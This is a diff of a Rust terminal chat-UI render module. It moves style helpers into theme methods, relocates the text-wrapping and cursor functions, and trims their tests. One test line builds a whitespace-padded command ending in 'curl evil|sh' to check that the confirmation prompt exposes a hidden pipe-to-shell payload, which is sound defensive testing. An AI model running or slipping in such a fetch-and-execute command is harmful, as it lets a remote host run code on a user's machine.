@@ -1,5 +1,6 @@
 //! ratatui render for the chat TUI. Mutates only layout outputs: the wrap cache,
-//! the last viewport height, and the confirmation prompt's clamped scroll.
+//! the last viewport height, the input's wrap width, and the confirmation
+//! prompt's clamped scroll.
 
 use std::time::Instant;
 
@@ -19,7 +20,10 @@ use super::app::{
     ResumeTab,
 };
 use super::output::{OutputPane, THUMBNAIL_ROWS, ThumbnailSlot, banner_lines};
-use super::settings::render_settings;
+use super::selection::list_window;
+use super::settings::{editor_window, place_cursor, render_settings};
+use super::text::{hard_wrap, locate_cursor, wrap_input};
+use super::text_editor::TextEditor;
 use super::theme::Theme;
 use crate::client::terminal_text::escape_controls_single_line;
 
@@ -91,6 +95,9 @@ fn render_chat(frame: &mut Frame<'_>, area: Rect, app: &mut App, theme: &Theme) 
     } else if let Some(review) = &app.plan_review {
         plan_mode::render_plan_review_dock(frame, chat_area, review, theme)
     } else {
+        let prompt_w = saturating_u16(INPUT_PROMPT.chars().count());
+        app.input
+            .set_wrap_width(chat_area.width.saturating_sub(prompt_w));
         render_input_dock(frame, chat_area, app, theme)
     };
     app.set_output_height(output_area.height);
@@ -158,7 +165,7 @@ fn render_resume_picker(
     render_resume_list(frame, list_area, &matches, picker.selected(), now, theme);
     let count = Span::styled(
         format!("{} of {}", matches.len(), picker.total()),
-        meta_style(theme),
+        theme.meta_style(),
     );
     frame.render_widget(Paragraph::new(count), count_area);
 }
@@ -167,9 +174,9 @@ fn render_resume_picker(
 fn resume_tabs(shown: ResumeTab, theme: &Theme) -> Line<'static> {
     let tab = |tab: ResumeTab, label: &'static str| {
         let style = if tab == shown {
-            pointer_style(theme)
+            theme.title_style()
         } else {
-            meta_style(theme)
+            theme.meta_style()
         };
         Span::styled(label, style)
     };
@@ -180,28 +187,21 @@ fn resume_tabs(shown: ResumeTab, theme: &Theme) -> Line<'static> {
     ])
 }
 
-/// The search query in a rounded box, with the cursor after it.
-fn render_resume_search(frame: &mut Frame<'_>, area: Rect, query: &str, theme: &Theme) {
-    let query = escape_controls_single_line(query);
-    let text = if query.is_empty() {
-        Span::styled("Search…", meta_style(theme))
-    } else {
-        Span::raw(query.as_ref())
-    };
+/// The search query in a rounded box, scrolled to keep its cursor in view.
+fn render_resume_search(frame: &mut Frame<'_>, area: Rect, query: &TextEditor, theme: &Theme) {
     let block = Block::bordered()
         .border_type(BorderType::Rounded)
-        .border_style(rule_style(theme))
+        .border_style(theme.rule_style())
         .padding(Padding::horizontal(1));
     let inner = block.inner(area);
+    let (shown, cursor_column) = editor_window(query, usize::from(inner.width));
+    let text = if shown.is_empty() {
+        Span::styled("Search…", theme.meta_style())
+    } else {
+        Span::raw(shown)
+    };
     frame.render_widget(Paragraph::new(text).block(block), area);
-    if inner.width == 0 || inner.height == 0 {
-        return;
-    }
-    let cursor_x = inner
-        .x
-        .saturating_add(saturating_u16(display_width(&query)))
-        .min(inner.right().saturating_sub(1));
-    frame.set_cursor_position(Position::new(cursor_x, inner.y));
+    place_cursor(frame, inner, 0, cursor_column);
 }
 
 /// The window of `matches` that keeps `selected` in view, or a note when
@@ -215,28 +215,15 @@ fn render_resume_list(
     theme: &Theme,
 ) {
     if matches.is_empty() {
-        let note = Span::styled("Nothing listed", meta_style(theme));
+        let note = Span::styled("Nothing listed", theme.meta_style());
         frame.render_widget(Paragraph::new(note), area);
         return;
     }
     let visible = (usize::from(area.height) / RESUME_ENTRY_ROWS).max(1);
-    let start = picker_scroll_start(selected, matches.len(), visible);
-    let lines: Vec<Line<'static>> = matches
-        .iter()
-        .enumerate()
-        .skip(start)
-        .take(visible)
-        .flat_map(|(index, entry)| resume_entry_rows(entry, index == selected, now, theme))
+    let lines: Vec<Line<'static>> = list_window(selected, matches.len(), visible, 0)
+        .flat_map(|index| resume_entry_rows(matches[index], index == selected, now, theme))
         .collect();
     frame.render_widget(Paragraph::new(Text::from(lines)), area);
-}
-
-/// First entry of a `visible`-row window that keeps `selected` in view.
-fn picker_scroll_start(selected: usize, total: usize, visible: usize) -> usize {
-    if total <= visible {
-        return 0;
-    }
-    (selected + 1).saturating_sub(visible).min(total - visible)
 }
 
 /// The session title, or a task run's task name, behind a selection pointer,
@@ -256,17 +243,17 @@ fn resume_entry_rows(
         .filter(|t| !t.is_empty())
         .map_or_else(|| "Untitled".into(), escape_controls_single_line);
     let (pointer, title_style) = if selected {
-        ("❯ ", pointer_style(theme))
+        ("❯ ", theme.title_style())
     } else {
         ("  ", Style::default())
     };
     let mut title_row = vec![Span::styled(format!("{pointer}{title}"), title_style)];
     if entry.is_active() {
-        title_row.push(Span::styled(" (current)", meta_style(theme)));
+        title_row.push(Span::styled(" (current)", theme.meta_style()));
     }
     let detail = Span::styled(
         format!("{RESUME_DETAIL_INDENT}{}", resume_entry_details(entry, now)),
-        Style::default().fg(theme.status_text),
+        theme.meta_style(),
     );
     [Line::from(title_row), Line::from(detail)]
 }
@@ -346,21 +333,16 @@ fn render_slash_popup(
         height,
         ..area
     };
-    let visible_rows = usize::from(height);
-    let first_visible = selected.saturating_sub(visible_rows - 1);
-    let lines: Vec<Line<'_>> = suggestions
-        .iter()
-        .enumerate()
-        .skip(first_visible)
-        .take(visible_rows)
-        .map(|(i, (cmd, hint))| {
-            let (style, hint_style) = if i == selected {
+    let lines: Vec<Line<'_>> = list_window(selected, suggestions.len(), usize::from(height), 0)
+        .map(|index| {
+            let (cmd, hint) = suggestions[index];
+            let (style, hint_style) = if index == selected {
                 (
                     theme.selection().add_modifier(Modifier::BOLD),
                     theme.selection(),
                 )
             } else {
-                (Style::default().fg(theme.accent), meta_style(theme))
+                (theme.accent_style(), theme.meta_style())
             };
             if hint.is_empty() {
                 Line::from(Span::styled(format!(" {cmd}"), style))
@@ -392,7 +374,7 @@ fn render_confirmation_dock(
     let [output_area, prompt_area] =
         Layout::vertical([Constraint::Min(0), Constraint::Length(height)]).areas(area);
     let tool = escape_controls_single_line(&prompt.request.tool);
-    let accent = confirm_accent(theme);
+    let accent = theme.warning_style();
     let title = match prompt.request.source {
         ConfirmSource::Main => format!(" Confirm {tool} "),
         ConfirmSource::Relay { run: None, .. } => format!(" Confirm {tool} for a relay sub-agent "),
@@ -446,7 +428,7 @@ fn relay_source_rows(source: &ConfirmSource, width: usize, theme: &Theme) -> Vec
     let mut rows = indented_rows(
         "",
         warning,
-        confirm_accent(theme).add_modifier(Modifier::BOLD),
+        theme.warning_style().add_modifier(Modifier::BOLD),
         width,
     );
     let task_style = Style::default().add_modifier(Modifier::ITALIC);
@@ -461,10 +443,6 @@ fn relay_source_rows(source: &ConfirmSource, width: usize, theme: &Theme) -> Vec
     rows.extend(task_rows);
     rows.push(Line::default());
     rows
-}
-
-fn confirm_accent(theme: &Theme) -> Style {
-    Style::default().fg(theme.warning)
 }
 
 /// The script in at most `budget` rows: the first few behind a marker
@@ -515,7 +493,7 @@ fn script_rows(
         .collect();
     lines.push(Line::from(Span::styled(
         format!("{SCRIPT_INDENT}{marker}"),
-        confirm_accent(theme),
+        theme.warning_style(),
     )));
     lines
 }
@@ -545,8 +523,8 @@ fn choice_rows(prompt: &ConfirmationPrompt, width: usize, theme: &Theme) -> Vec<
                 ConfirmChoice::Always => always_label(prompt),
                 ConfirmChoice::Deny => "No (Esc)".to_string(),
             };
-            let (pointer, style) = if index == prompt.selected {
-                ("❯", pointer_style(theme))
+            let (pointer, style) = if index == prompt.selected.index() {
+                ("❯", theme.title_style())
             } else {
                 (" ", Style::default())
             };
@@ -593,26 +571,6 @@ fn indented_rows(lead: &str, text: &str, style: Style, width: usize) -> Vec<Line
             Line::from(Span::styled(format!("{lead}{chunk}"), style))
         })
         .collect()
-}
-
-/// Split `text` into rows of at most `width` display columns, breaking
-/// anywhere so whitespace is kept verbatim. Always yields at least one row.
-fn hard_wrap(text: &str, width: usize) -> Vec<String> {
-    let width = width.max(1);
-    let mut rows = Vec::new();
-    let mut row = String::new();
-    let mut row_width = 0;
-    for c in text.chars() {
-        let char_width = display_width(c.encode_utf8(&mut [0; 4]));
-        if row_width + char_width > width && row_width > 0 {
-            rows.push(std::mem::take(&mut row));
-            row_width = 0;
-        }
-        row.push(c);
-        row_width += char_width;
-    }
-    rows.push(row);
-    rows
 }
 
 /// The transcript, with a blank row and the generating row below it while
@@ -701,16 +659,12 @@ fn render_generating_row(
     };
     let mut spans = vec![Span::styled(
         format!("{} Generating… ({progress})", app.spinner_char()),
-        Style::default()
-            .fg(theme.status_text)
-            .add_modifier(Modifier::ITALIC),
+        theme.aside_style(),
     )];
     if app.compacting_soon {
         spans.push(Span::styled(
             " · compacting soon",
-            Style::default()
-                .fg(theme.accent)
-                .add_modifier(Modifier::ITALIC),
+            theme.accent_style().add_modifier(Modifier::ITALIC),
         ));
     }
     frame.render_widget(Paragraph::new(Line::from(spans)), row);
@@ -746,7 +700,7 @@ pub(super) fn compact_count(count: u64) -> String {
 
 fn render_rule(frame: &mut Frame<'_>, area: Rect, theme: &Theme) {
     let rule = RULE.repeat(usize::from(area.width));
-    frame.render_widget(Paragraph::new(Span::styled(rule, rule_style(theme))), area);
+    frame.render_widget(Paragraph::new(Span::styled(rule, theme.rule_style())), area);
 }
 
 fn render_mode_line(frame: &mut Frame<'_>, area: Rect, mode: ChatMode, theme: &Theme) {
@@ -756,10 +710,7 @@ fn render_mode_line(frame: &mut Frame<'_>, area: Rect, mode: ChatMode, theme: &T
         ChatMode::Act(PermissionMode::Auto) => "auto mode on",
         ChatMode::Plan => "plan mode on",
     };
-    let line = Span::styled(
-        format!("{label} (shift+tab)"),
-        Style::default().fg(theme.accent),
-    );
+    let line = Span::styled(format!("{label} (shift+tab)"), theme.accent_style());
     frame.render_widget(Paragraph::new(line), area);
 }
 
@@ -767,10 +718,8 @@ fn render_mode_line(frame: &mut Frame<'_>, area: Rect, mode: ChatMode, theme: &T
 /// tasks needing input and running, then a notice, the scroll position or the interrupt
 /// hint, left-aligned and gray but for warnings.
 fn render_status_line(frame: &mut Frame<'_>, area: Rect, app: &App, theme: &Theme) {
-    let text_style = Style::default().fg(theme.status_text);
-    let warning_style = Style::default()
-        .fg(theme.warning)
-        .add_modifier(Modifier::BOLD);
+    let text_style = theme.meta_style();
+    let warning_style = theme.warning_style().add_modifier(Modifier::BOLD);
     let offline = (!app.daemon_reachable).then(|| ("daemon offline".to_string(), warning_style));
     let queue = app
         .task_queue()
@@ -796,7 +745,7 @@ fn render_status_line(frame: &mut Frame<'_>, area: Rect, app: &App, theme: &Them
     let mut spans = Vec::new();
     for (text, style) in segments {
         if !spans.is_empty() {
-            spans.push(Span::styled(" · ", rule_style(theme)));
+            spans.push(Span::styled(" · ", theme.rule_style()));
         }
         spans.push(Span::styled(text, style));
     }
@@ -847,20 +796,6 @@ fn status_hint(app: &App) -> Option<String> {
     }
 }
 
-fn rule_style(theme: &Theme) -> Style {
-    Style::default().fg(theme.border)
-}
-
-fn meta_style(theme: &Theme) -> Style {
-    Style::default().fg(theme.status_text)
-}
-
-fn pointer_style(theme: &Theme) -> Style {
-    Style::default()
-        .fg(theme.accent)
-        .add_modifier(Modifier::BOLD)
-}
-
 fn voice_indicator(s: VoiceCaptureState) -> Option<&'static str> {
     match s {
         VoiceCaptureState::Idle => None,
@@ -893,7 +828,7 @@ fn render_input(frame: &mut Frame<'_>, area: Rect, app: &App) {
         .collect();
     frame.render_widget(Paragraph::new(Text::from(lines)), area);
 
-    let (row_idx, col) = locate_cursor(&rows, app.input.cursor_offset() as usize);
+    let (row_idx, col) = locate_cursor(&rows, app.input.cursor_chars());
     let cursor_x = saturating_u16(col).saturating_add(prompt_w);
     let cy = area
         .y
@@ -914,72 +849,6 @@ fn compute_input_height(frame_width: u16, dock_height: u16, buffer: &str) -> u16
     let needed = saturating_u16(wrap_input(&chars, prompt_w, frame_width).len());
     let cap = dock_height.saturating_sub(5).max(1);
     needed.clamp(1, cap)
-}
-
-/// `(start, end)` char ranges of each input row: a new row at each line
-/// break, otherwise after the last whitespace that fits past the prompt. A
-/// final row that fills the width is followed by an empty one for the cursor.
-pub(super) fn wrap_input(buf: &[char], prompt_w: u16, width: u16) -> Vec<(usize, usize)> {
-    let n = buf.len();
-    if width == 0 {
-        return vec![(0, n)];
-    }
-    let cap = width.saturating_sub(prompt_w).max(1) as usize;
-    let mut rows: Vec<(usize, usize)> = Vec::new();
-    let line_ends = buf
-        .iter()
-        .enumerate()
-        .filter_map(|(i, &c)| (c == '\n').then_some(i))
-        .chain([n]);
-    let mut start = 0usize;
-    for end in line_ends {
-        wrap_input_line(buf, (start, end), cap, &mut rows);
-        start = end + 1;
-    }
-    let (ls, le) = *rows.last().expect("rows non-empty");
-    if le - ls >= cap {
-        rows.push((n, n));
-    }
-    rows
-}
-
-/// Append the rows, at most `cap` chars each, of the break-free span
-/// `(start, end)` to `rows`, always at least one.
-fn wrap_input_line(
-    buf: &[char],
-    (mut start, end): (usize, usize),
-    cap: usize,
-    rows: &mut Vec<(usize, usize)>,
-) {
-    while end - start > cap {
-        let end_max = start + cap;
-        let row_end = buf[start..end_max]
-            .iter()
-            .rposition(|c| c.is_whitespace())
-            .map_or(end_max, |i| start + i + 1);
-        rows.push((start, row_end));
-        start = row_end;
-    }
-    rows.push((start, end));
-}
-
-/// Row and column of char offset `cursor`. At a soft wrap the cursor moves
-/// to the next row; before a line break it stays at the end of its row.
-pub(super) fn locate_cursor(rows: &[(usize, usize)], cursor: usize) -> (usize, usize) {
-    for (idx, &(s, e)) in rows.iter().enumerate() {
-        if cursor < e {
-            return (idx, cursor - s);
-        }
-        if cursor == e {
-            if rows.get(idx + 1).is_some_and(|&(next, _)| next == e) {
-                return (idx + 1, 0);
-            }
-            return (idx, cursor - s);
-        }
-    }
-    let last = rows.len().saturating_sub(1);
-    let (s, e) = rows.get(last).copied().unwrap_or((0, 0));
-    (last, cursor.saturating_sub(s).min(e - s))
 }
 
 fn saturating_u16(value: usize) -> u16 {
@@ -1043,12 +912,6 @@ mod tests {
     }
 
     #[test]
-    fn hard_wrap_breaks_before_a_wide_char_that_would_overflow() {
-        assert_eq!(hard_wrap("ab漢", 3), vec!["ab", "漢"]);
-        assert_eq!(hard_wrap("", 3), vec![""]);
-    }
-
-    #[test]
     fn confirmation_prompt_shows_the_tail_of_a_padded_command() {
         let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(120));
         let screen = prompt_screen(&mut confirmation_prompt(&script), 160, 40);
@@ -1090,44 +953,5 @@ mod tests {
             "a full first row wraps the cursor onto a second"
         );
         assert_eq!(compute_input_height(10, 24, &"a".repeat(18)), 3);
-    }
-
-    fn chars(s: &str) -> Vec<char> {
-        s.chars().collect()
-    }
-
-    #[test]
-    fn wrap_input_hard_breaks_when_word_is_longer_than_row() {
-        let rows = wrap_input(&chars("hellotherefriend"), 2, 10);
-        assert_eq!(rows, vec![(0, 8), (8, 16), (16, 16)]);
-    }
-
-    #[test]
-    fn locate_cursor_jumps_to_next_row_on_boundary() {
-        let buf = chars("hello world");
-        let rows = wrap_input(&buf, 2, 10);
-        assert_eq!(rows, [(0, 6), (6, 11)]);
-        assert_eq!(locate_cursor(&rows, 0), (0, 0));
-        assert_eq!(locate_cursor(&rows, 5), (0, 5));
-        assert_eq!(locate_cursor(&rows, 6), (1, 0));
-        assert_eq!(locate_cursor(&rows, 11), (1, 5));
-    }
-
-    #[test]
-    fn line_breaks_start_rows_and_place_cursor_around_them() {
-        let buf = chars("ab\n\ncd\n");
-        let rows = wrap_input(&buf, 2, 10);
-        assert_eq!(rows, [(0, 2), (3, 3), (4, 6), (7, 7)]);
-        assert_eq!(locate_cursor(&rows, 2), (0, 2));
-        assert_eq!(locate_cursor(&rows, 3), (1, 0));
-        assert_eq!(locate_cursor(&rows, 6), (2, 2));
-        assert_eq!(locate_cursor(&rows, 7), (3, 0));
-    }
-
-    #[test]
-    fn locate_cursor_lands_on_phantom_row_after_full_row() {
-        let buf = chars("aaaaaaaa");
-        let rows = wrap_input(&buf, 2, 10);
-        assert_eq!(locate_cursor(&rows, 8), (1, 0));
     }
 }
